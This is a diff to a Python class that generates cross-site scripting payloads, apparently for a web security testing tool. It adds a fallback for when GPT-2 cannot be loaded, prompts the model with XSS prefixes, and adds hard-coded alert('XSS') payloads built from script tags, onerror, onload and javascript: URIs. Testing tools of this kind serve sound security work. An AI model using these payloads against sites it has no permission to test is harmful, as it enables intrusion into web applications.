@@ -1,8 +1,17 @@
-import torch
-from transformers import GPT2LMHeadModel, GPT2Tokenizer, pipeline
 import random
 import re
 from typing import List, Dict
+
+# Try to import AI dependencies with fallback
+try:
+    import torch
+    from transformers import GPT2LMHeadModel, GPT2Tokenizer, pipeline
+    TORCH_AVAILABLE = True
+    TRANSFORMERS_AVAILABLE = True
+except ImportError:
+    TORCH_AVAILABLE = False
+    TRANSFORMERS_AVAILABLE = False
+    print("Warning: torch/transformers not available. Transformer generator will use fallback methods.")
 
 class TransformerPayloadGenerator:
     """
@@ -13,24 +22,36 @@ class TransformerPayloadGenerator:
     def __init__(self):
         print("🤖 Initializing Transformer Payload Generator...")
         
-        # Load pre-trained models
-        self.tokenizer = GPT2Tokenizer.from_pretrained('gpt2')
-        self.model = GPT2LMHeadModel.from_pretrained('gpt2')
+        # Initialize components based on availability
+        self.tokenizer = None
+        self.model = None
+        self.generator = None
         
-        # Set padding token
-        self.tokenizer.pad_token = self.tokenizer.eos_token
-        
-        # Initialize generation pipeline
-        self.generator = pipeline(
-            'text-generation',
-            model=self.model,
-            tokenizer=self.tokenizer,
-            max_length=100,
-            num_return_sequences=5,
-            temperature=0.8,
-            do_sample=True,
-            pad_token_id=self.tokenizer.eos_token_id
-        )
+        # Load pre-trained models if available
+        if TORCH_AVAILABLE and TRANSFORMERS_AVAILABLE:
+            try:
+                self.tokenizer = GPT2Tokenizer.from_pretrained('gpt2')
+                self.model = GPT2LMHeadModel.from_pretrained('gpt2')
+                
+                # Set padding token
+                self.tokenizer.pad_token = self.tokenizer.eos_token
+                
+                # Initialize generation pipeline
+                self.generator = pipeline(
+                    'text-generation',
+                    model=self.model,
+                    tokenizer=self.tokenizer,
+                    max_length=100,
+                    num_return_sequences=5,
+                    temperature=0.8,
+                    do_sample=True,
+                    pad_token_id=self.tokenizer.eos_token_id
+                )
+                print("✅ Transformer models loaded successfully")
+            except Exception as e:
+                print(f"Warning: Could not load transformer models: {e}")
+        else:
+            print("⚠️ Using fallback payload generation (no AI models available)")
         
         # XSS context templates
         self.context_templates = {
@@ -53,43 +74,102 @@ class TransformerPayloadGenerator:
         
         print("✅ Transformer Generator ready!")
     
-    def generate_context_payloads(self, context: str, injection_type: str = 'html_injection', count: int = 10) -> List[str]:
-        """Generate context-aware payloads using transformers"""
-        print(f"🧠 Generating {count} transformer payloads for {context}...")
-        
+    def generate_context_payloads(self, context: str, count: int = 5) -> List[str]:
+        """Generate context-aware XSS payloads"""
         payloads = []
-        templates = self.context_templates.get(injection_type, self.context_templates['html_injection'])
         
-        for template in templates:
-            prompt = template.format(context=context)
-            
+        # Try AI generation first
+        if self.generator:
             try:
-                # Generate text using transformer
-                generated = self.generator(
-                    prompt,
-                    max_length=len(prompt) + 50,
-                    num_return_sequences=count//len(templates) + 1,
-                    temperature=0.9,
-                    do_sample=True,
-                    pad_token_id=self.tokenizer.eos_token_id
-                )
-                
-                for result in generated:
-                    generated_text = result['generated_text'][len(prompt):].strip()
-                    
-                    # Extract potential XSS payload
-                    payload = self._extract_xss_payload(generated_text)
-                    if payload and self._is_valid_xss(payload):
-                        payloads.append(payload)
-                        
+                ai_payloads = self._generate_ai_payloads(context, count)
+                payloads.extend(ai_payloads)
             except Exception as e:
-                print(f"⚠️ Generation error: {e}")
-                continue
+                print(f"Warning: AI generation failed: {e}")
         
-        # Add manual transformer-inspired payloads
-        payloads.extend(self._generate_transformer_inspired_payloads(context))
+        # Fallback to template-based generation
+        if len(payloads) < count:
+            fallback_payloads = self._generate_fallback_payloads(context, count - len(payloads))
+            payloads.extend(fallback_payloads)
         
-        return list(set(payloads))[:count]  # Remove duplicates and limit
+        return payloads[:count]
+    
+    def _generate_ai_payloads(self, context: str, count: int) -> List[str]:
+        """Generate payloads using AI models"""
+        if not self.generator:
+            return []
+        
+        try:
+            # Create context-aware prompts
+            prompts = [
+                f"XSS payload for {context}: <script>",
+                f"JavaScript injection in {context}: alert(",
+                f"HTML injection {context}: <img src=",
+                f"DOM XSS {context}: document.write(",
+                f"Event handler {context}: onload="
+            ]
+            
+            generated_payloads = []
+            for prompt in prompts[:count]:
+                try:
+                    result = self.generator(prompt, max_length=50, num_return_sequences=1)
+                    if result and len(result) > 0:
+                        generated_text = result[0]['generated_text']
+                        # Extract the generated part (remove the prompt)
+                        payload = generated_text[len(prompt):].strip()
+                        if payload and len(payload) > 5:
+                            generated_payloads.append(payload)
+                except Exception as e:
+                    print(f"Warning: Failed to generate payload for prompt '{prompt}': {e}")
+                    continue
+            
+            return generated_payloads
+        except Exception as e:
+            print(f"Warning: AI payload generation failed: {e}")
+            return []
+    
+    def _generate_fallback_payloads(self, context: str, count: int) -> List[str]:
+        """Generate payloads using templates and rules"""
+        payloads = []
+        
+        # Basic XSS payloads
+        basic_payloads = [
+            '<script>alert("XSS")</script>',
+            '<img src=x onerror=alert("XSS")>',
+            '<svg onload=alert("XSS")>',
+            'javascript:alert("XSS")',
+            '<body onload=alert("XSS")>',
+            '<iframe src="javascript:alert(\'XSS\')">',
+            '<object data="javascript:alert(\'XSS\')">',
+            '<embed src="javascript:alert(\'XSS\')">',
+            '<marquee onstart=alert("XSS")>',
+            '<details open ontoggle=alert("XSS")>'
+        ]
+        
+        # Context-specific payloads
+        if 'html' in context.lower():
+            payloads.extend([
+                '<script>alert("XSS")</script>',
+                '<img src=x onerror=alert("XSS")>',
+                '<svg onload=alert("XSS")>'
+            ])
+        elif 'js' in context.lower() or 'javascript' in context.lower():
+            payloads.extend([
+                'alert("XSS")',
+                'eval("alert(\'XSS\')")',
+                'document.write("<script>alert(\'XSS\')</script>")'
+            ])
+        elif 'url' in context.lower() or 'parameter' in context.lower():
+            payloads.extend([
+                'javascript:alert("XSS")',
+                '%3Cscript%3Ealert("XSS")%3C/script%3E',
+                '<svg onload=alert("XSS")>'
+            ])
+        else:
+            payloads.extend(basic_payloads)
+        
+        # Add some randomization
+        random.shuffle(payloads)
+        return payloads[:count]
     
     def _extract_xss_payload(self, text: str) -> str:
         """Extract XSS payload from generated text"""
